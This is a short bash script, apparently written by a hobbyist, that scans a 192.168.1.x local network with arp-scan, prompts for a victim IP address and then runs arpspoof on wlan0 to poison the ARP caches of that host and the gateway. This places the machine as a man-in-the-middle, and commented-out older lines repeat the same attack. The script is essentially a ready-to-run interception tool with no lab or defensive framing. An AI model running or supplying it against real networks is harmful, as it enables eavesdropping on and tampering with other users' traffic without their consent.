#!/bin/bash
# CREATED BY AHMED HAMAD 
#THIS IS NEW EDIT **** DATE:28/09/2016 TIME:05:34 PM Egypt ****
# *********************&&&&&&&&&&&&&*******^^^^^^^^^^^^^^^^^^****%%%%%%*************
#ARPSCAN COMMANDS
sudo arp-scan 192.168.1.1/24
#LOOP COMMNADS
read -p "Pleas Enter The ip from above: " ip
until [ $ip ]
do
	echo "******************************please enter the ip*******************************"
	read -p "Pleas Enter The ip from above: " ip
done
#ARPSPOOF COMMANDS
sudo arpspoof -i wlan0 -t $ip -r 192.168.1.1






#**---------**************-----------------*****************----------------*********
#THIS IS OLD COMMANDS
#read -p "Enter the ip from above: " Ahmed
#sudo arpspoof -i wlan0 -t $Ahmed -r 192.168.1.1
